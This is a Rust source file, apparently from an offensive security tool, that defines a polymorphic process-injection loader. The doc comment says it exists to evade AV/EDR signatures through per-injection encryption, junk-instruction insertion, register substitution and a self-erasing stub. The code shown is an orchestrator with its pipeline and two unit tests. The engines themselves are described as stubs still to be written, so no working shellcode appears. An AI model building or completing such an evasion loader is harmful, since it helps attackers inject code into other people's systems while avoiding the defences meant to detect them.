//! Polymorphic & self-mutating injection shellcode.
//!
//! EPIC #734 — replaces the static reflective loader with per-injection
//! unique byte patterns and a self-erasing runtime stub. The current static
//! loader (`inject/reflective.rs`) emits the same bytes every injection,
//! producing a stable signature for AV/EDR scanners. This module assembles a
//! fresh loader stub for each call and erases its trace after the payload is
//! mapped.
//!
//! ## Sub-modules (one per sub-issue)
//! - [`stub_gen`] — #735 polymorphic loader stub generator (orchestrator)
//! - [`encryptor`] — #736 per-injection encryption with unique keys
//! - [`self_erase`] — #737 self-erasing injection stub
//! - [`junk`]      — #738 junk code insertion engine
//! - [`substitute`] — #739 register / instruction substitution engine
//!
//! ## Status
//! Foundation + stubs. Each sub-module exposes the public API its sub-issue
//! requires; full implementations land in dedicated PRs (#735–#739). The
//! [`PolymorphicLoader::generate`] entry point wires them together so callers
//! see a single, stable surface.

pub mod encryptor;
pub mod junk;
pub mod self_erase;
pub mod stub_gen;
pub mod substitute;

use rand::RngCore;

/// Errors returned by the polymorphic injection pipeline.
#[derive(Debug, thiserror::Error)]
pub enum PolymorphicError {
    /// Stub generator failed to assemble a unique loader.
    #[error("stub generation failed: {0}")]
    StubGen(String),
    /// Encryption failed (key derivation, AEAD, etc.).
    #[error("encryption failed: {0}")]
    Encrypt(String),
    /// Self-erase routine could not be appended.
    #[error("self-erase wiring failed: {0}")]
    SelfErase(String),
    /// Junk insertion produced an invalid instruction stream.
    #[error("junk insertion failed: {0}")]
    Junk(String),
    /// Substitution engine could not transform an instruction.
    #[error("substitution failed: {0}")]
    Substitute(String),
}

/// Parameters that drive a single polymorphic generation pass.
#[derive(Debug, Clone)]
pub struct PolymorphicConfig {
    /// Insert junk instructions between real ones.
    pub junk_density: u8,
    /// Apply register/instruction substitution.
    pub substitute: bool,
    /// Encrypt the payload with a freshly derived key.
    pub encrypt: bool,
    /// Wire the self-erase routine that wipes the loader after DLL load.
    pub self_erase: bool,
}

impl Default for PolymorphicConfig {
    fn default() -> Self {
        Self {
            junk_density: 4,
            substitute: true,
            encrypt: true,
            self_erase: true,
        }
    }
}

/// A generated, single-use polymorphic loader.
#[derive(Debug)]
pub struct GeneratedLoader {
    /// Loader stub bytes (decryptor + mapper + self-erase trampoline).
    pub stub: Vec<u8>,
    /// Encrypted payload bytes (the DLL).
    pub payload: Vec<u8>,
    /// 32-byte injection key — burned after use.
    pub key: [u8; 32],
    /// Per-injection nonce / IV.
    pub nonce: [u8; 12],
}

/// High-level orchestrator that ties all five sub-issue engines together.
pub struct PolymorphicLoader;

impl PolymorphicLoader {
    /// Generate a unique loader+payload pair for a single injection.
    ///
    /// The pipeline runs in this order:
    /// 1. derive a fresh key + nonce ([`encryptor`])
    /// 2. encrypt the DLL ([`encryptor`])
    /// 3. emit a base loader stub ([`stub_gen`])
    /// 4. apply register/instruction substitution ([`substitute`])
    /// 5. interleave junk instructions ([`junk`])
    /// 6. append the self-erase trampoline ([`self_erase`])
    ///
    /// Stub-only today. Sub-issues will replace each step with a real
    /// engine; the call sites and types are stable.
    pub fn generate(
        dll_bytes: &[u8],
        cfg: &PolymorphicConfig,
    ) -> Result<GeneratedLoader, PolymorphicError> {
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        rand::rng().fill_bytes(&mut key);
        rand::rng().fill_bytes(&mut nonce);

        let payload = if cfg.encrypt {
            encryptor::encrypt_payload(dll_bytes, &key, &nonce)?
        } else {
            dll_bytes.to_vec()
        };

        let emitted_stub = stub_gen::emit_base_stub(&key, &nonce)?;
        let mut stub = emitted_stub.bytes;
        if cfg.substitute {
            stub = substitute::transform_with_protected_ranges(
                &stub,
                &[emitted_stub.key_nonce_range],
            )?;
        }
        if cfg.junk_density > 0 {
            stub = junk::interleave(&stub, cfg.junk_density)?;
        }
        if cfg.self_erase {
            stub = self_erase::wire_trampoline(&stub)?;
        }

        Ok(GeneratedLoader {
            stub,
            payload,
            key,
            nonce,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generate_produces_unique_stubs_per_call() {
        let dll = b"PE\0\0fake-dll-bytes-for-test";
        let cfg = PolymorphicConfig::default();
        let a = PolymorphicLoader::generate(dll, &cfg).expect("generate a");
        let b = PolymorphicLoader::generate(dll, &cfg).expect("generate b");
        // Keys/nonces must differ across calls — this is the polymorphism
        // contract regardless of how rich the engines become.
        assert_ne!(a.key, b.key);
        assert_ne!(a.nonce, b.nonce);
    }

    #[test]
    fn config_defaults_enable_full_pipeline() {
        let cfg = PolymorphicConfig::default();
        assert!(cfg.encrypt);
        assert!(cfg.substitute);
        assert!(cfg.self_erase);
        assert!(cfg.junk_density > 0);
    }
}
